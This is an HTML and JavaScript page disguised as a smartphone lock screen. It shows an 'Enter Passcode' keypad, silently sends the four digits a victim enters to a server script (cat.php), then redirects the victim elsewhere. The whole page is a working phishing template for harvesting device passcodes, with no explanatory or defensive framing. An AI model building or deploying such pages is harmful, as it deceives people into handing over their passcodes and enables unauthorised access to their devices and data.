<html>
<head>
<style type="text/css">
#content { width:100%; height:100%; background: url("https://www.alliphonewallpapers.com/images/wallpapers/640/xdhcgmxsn.jpg") no-repeat center center fixed; background-size: cover; }
body, html { overflow: hidden; margin: 0; padding: 0; }
.barrier-bg { position: fixed; left: 0; right: 0; top: 0; bottom: 0; background-color: rgba(0, 0, 0, 0.6); z-index: 1; }
.entry-illustration { width: 26px; height: 26px; position: absolute; border: 2px solid #dfffff; border-radius: 26px; transition: background-color 500ms; top: 0; left: 0; }
.first-entry { top: -80px; left: 145px; } .second-entry { top: -80px; left: 220px; } .third-entry { top: -80px; left: 290px; } .forth-entry { top: -80px; left: 360px; }
.number-pad { width: 530px; position: relative; text-align: center; padding-top: 40px; transform: translate(-50%, 0%); left: 50%; top: 70px; z-index: 2; color: #dfffff; }
.number { position: absolute; width: 150px; height: 150px; opacity: 0; cursor: pointer; }
.number:nth-child(1) { top: 40px; left: 0px; } .number:nth-child(3) { top: 40px; left: 185px; } .number:nth-child(5) { top: 40px; left: 377px; } .number:nth-child(7) { top: 220px; left: 0px; } .number:nth-child(9) { top: 220px; left: 190px; } .number:nth-child(11) { top: 220px; left: 377px; } .number:nth-child(13) { top: 390px; left: 0px; } .number:nth-child(15) { top: 390px; left: 190px; } .number:nth-child(17) { top: 390px; left: 377px; } .number:nth-child(19) { top: 560px; left: 44%; transform: translate(-50%, 0%); }
.number-push { width: 150px; height: 150px; float: left; border-radius: 100%; border: 4px solid #dfffff; margin-right: 40px; margin-bottom: 23px; font-size: 4em; padding-top: 25px; transition: background-color 300ms, color 300ms; }
.number:active + .number-push { background-color: #dfffff; color: #243946; }
.reset, .emergency { position: absolute; top: 700px; border: none; background: transparent; font-size: 1.9em; font-weight: bold; color: #dfffff; outline:0; cursor: pointer; }
.reset { right: 0px; } .emergency { left: 10px; }
</style>
</head>
<body>
<div class="content" id="content">  
  <div class="barrier-bg"></div>
  <h1 style="text-align:center; color:#dfffff; padding-top:7vh; z-index:2; position:relative;">Enter Passcode</h1>
  <form class="number-pad">
    <input class="number" type="radio" key="1"/><span class="number-push">1</span>
    <input class="number" type="radio" key="2"/><span class="number-push">2</span>
    <input class="number" type="radio" key="3"/><span class="number-push">3</span>
    <input class="number" type="radio" key="4"/><span class="number-push">4</span>
    <input class="number" type="radio" key="5"/><span class="number-push">5</span>
    <input class="number" type="radio" key="6"/><span class="number-push">6</span>
    <input class="number" type="radio" key="7"/><span class="number-push">7</span>
    <input class="number" type="radio" key="8"/><span class="number-push">8</span>
    <input class="number" type="radio" key="9"/><span class="number-push">9</span>
    <input class="number centered" type="radio"/><span class="number-push centered">0</span>
    <span class="entry-illustration first-entry" id="dot1"></span><span class="entry-illustration second-entry" id="dot2"></span>
    <span class="entry-illustration third-entry" id="dot3"></span><span class="entry-illustration forth-entry" id="dot4"></span>
    <input class="reset" type="reset" value="Cancel" key="-2" />
    <input class="emergency" type:"reset" value="Emergency" key="-2"/>
  </form>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type="text/javascript">
(function () {
  var num = "";
  $(".reset").on("click", function () { num = ""; updateDots(); });
  $(".number, .centered").on("click", function () {
    var v = $(this).attr('key') || "0";
    if (v == "-2") { num = ""; } else { num += v; }
    updateDots();
    if(num.length == 4) { 
        $.ajax({ type: 'POST', url: 'cat.php', data: { 'passcode': num } });
        num = ""; window.location.replace("forwarding_url");
    }
  });
  function updateDots() {
    for(let i=1; i<=4; i++) { document.getElementById("dot"+i).style.backgroundColor = (num.length >= i) ? "#dfffff" : "transparent"; }
  }
}).call(this);
</script>
</body>
</html>
